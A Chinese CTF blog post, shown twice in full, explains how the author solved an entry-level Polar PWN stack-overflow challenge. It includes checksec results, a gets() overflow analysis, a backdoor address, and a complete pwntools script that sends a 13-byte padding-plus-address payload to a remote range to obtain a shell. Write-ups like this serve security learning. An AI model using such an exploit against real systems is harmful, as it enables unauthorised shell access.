---
title: CTF｜Polar-PWN-小狗汪汪汪
date: 2026-05-01 03:30:00
updated: 2026-05-01 03:30:00
categories:
  - CTF解题
tags:
  - CTF
  - 信息安全
---

# 前言
第一次写博客，刚刚学了pwn就找了道题当我的开山之作，题目是Polar方向PWN的'小狗汪汪汪'

# 题目信息
- 赛事：【2023秋季个人挑战赛】
- 类型：Pwn
- 难度：入门
- 考点：栈溢出

# 题目描述
小狗汪汪汪

# 解题环境准备
## 1. 工具清单
- 调试工具：pwndbg / gef
- 反编译工具：IDA Pro 7.7
- 辅助工具：checksec、pwntools（Python库）

## 2. 题目初步分析（checksec 检查）
```bash
# 终端执行命令，粘贴输出结果
checksec woof  # woof 为题目可执行文件名
```
- 由于忘了截图就顺便找了张图
![checksec 检查截图](http://116.62.80.109/img/pwn1.png)
- 32位,无 Canary,无 PIE,开了NX(后面看看有没有自带的后门函数)

# 详细解题过程

## 1. 反编译分析（IDA/ Ghidra）

### 1.1 主函数逻辑

![main()反编译截图](http://116.62.80.109/img/pwn2.png)

### 1.2 进入dog()函数(init是初始化函数不用看他)

![dog()反编译截图](http://116.62.80.109/img/pwn3.png)

- ok啊,非常合理地使用 `gets(s)` 读取输入，未限制输入长度
- 再让我们看看dog()的栈结构
    
![dog()的栈结构截图](http://116.62.80.109/img/pwn4.png)

- 溢出偏移量：0x9+4 (0x9是为了填充缓冲区,再加4 字节的栈底ebp)
- 
### 1.3 找找有没有后门函数

- 我靠真有
- 
![后门函数截图](http://116.62.80.109/img/pwn5.png)

- 再看看地址 0x804859B

## 2. 漏洞分析

- 漏洞点：使用 `gets(s)` 读取输入，未限制输入长度，而 s 缓冲区仅9字节，输入超过13字节会覆盖栈上的返回地址，控制程序执行流程。
- 利用思路：因为开了NX,所以可以构造溢出 payload，覆盖返回地址，跳转到 system("/bin/sh")，获取 shell。

## 3. 完整 EXP 脚本（pwntools 编写）

- 开靶场!

```python
from pwn import *

# 连接远程服务器
p=remote('1.95.36.136',2065) #里面填靶场的IP与端口

# -------------------- 关键信息 --------------------
# 溢出偏移
payying=0x9+4

# 后门地址 /bin/sh 地址
bin_sh=0x804859B

# -------------------- 构造 Payload --------------------
# 垃圾数据填充 + 覆盖返回地址为后门地址
payload=b'A'*payying + p32(bin_sh)

# 发送攻击
p.sendline(payload)

# 获得交互式 shell
p.interactive()
```
- 放个图吧

![EXP脚本截图](http://116.62.80.109/img/pwn6.png)


## 4. 运行 EXP 并获取 Flag

![getshell截图](http://116.62.80.109/img/pwn7.png)

# 总结复盘
- 非常常规的一道pwn栈溢出题,没什么好复盘的---
title: CTF｜Polar-PWN-小狗汪汪汪
date: 2026-05-01 03:30:00
updated: 2026-05-01 03:30:00
categories:
  - CTF解题
tags:
  - CTF
  - 信息安全
cover: http://116.62.80.109/img/inder.png
toc: true
---

# 前言
第一次写博客，刚刚学了pwn就找了道题当我的开山之作，题目是Polar方向PWN的'小狗汪汪汪'

# 题目信息
- 赛事：【2023秋季个人挑战赛】
- 类型：Pwn
- 难度：入门
- 考点：栈溢出

# 题目描述
小狗汪汪汪

# 解题环境准备
## 1. 工具清单
- 调试工具：pwndbg / gef
- 反编译工具：IDA Pro 7.7
- 辅助工具：checksec、pwntools（Python库）

## 2. 题目初步分析（checksec 检查）
```bash
# 终端执行命令，粘贴输出结果
checksec woof  # woof 为题目可执行文件名
```
- 由于忘了截图就顺便找了张图
![checksec 检查截图](http://116.62.80.109/img/pwn1.png)
- 32位,无 Canary,无 PIE,开了NX(后面看看有没有自带的后门函数)

# 详细解题过程

## 1. 反编译分析（IDA/ Ghidra）

### 1.1 主函数逻辑

![main()反编译截图](http://116.62.80.109/img/pwn2.png)

### 1.2 进入dog()函数(init是初始化函数不用看他)

![dog()反编译截图](http://116.62.80.109/img/pwn3.png)

- ok啊,非常合理地使用 `gets(s)` 读取输入，未限制输入长度
- 再让我们看看dog()的栈结构
    
![dog()的栈结构截图](http://116.62.80.109/img/pwn4.png)

- 溢出偏移量：0x9+4 (0x9是为了填充缓冲区,再加4 字节的栈底ebp)
- 
### 1.3 找找有没有后门函数

- 我靠真有
- 
![后门函数截图](http://116.62.80.109/img/pwn5.png)

- 再看看地址 0x804859B

## 2. 漏洞分析

- 漏洞点：使用 `gets(s)` 读取输入，未限制输入长度，而 s 缓冲区仅9字节，输入超过13字节会覆盖栈上的返回地址，控制程序执行流程。
- 利用思路：因为开了NX,所以可以构造溢出 payload，覆盖返回地址，跳转到 system("/bin/sh")，获取 shell。

## 3. 完整 EXP 脚本（pwntools 编写）

- 开靶场!

```python
from pwn import *

# 连接远程服务器
p=remote('1.95.36.136',2065) #里面填靶场的IP与端口

# -------------------- 关键信息 --------------------
# 溢出偏移
payying=0x9+4

# 后门地址 /bin/sh 地址
bin_sh=0x804859B

# -------------------- 构造 Payload --------------------
# 垃圾数据填充 + 覆盖返回地址为后门地址
payload=b'A'*payying + p32(bin_sh)

# 发送攻击
p.sendline(payload)

# 获得交互式 shell
p.interactive()
```
- 放个图吧

![EXP脚本截图](http://116.62.80.109/img/pwn6.png)


## 4. 运行 EXP 并获取 Flag

![getshell截图](http://116.62.80.109/img/pwn7.png)

# 总结复盘
- 非常常规的一道pwn栈溢出题,没什么好复盘的
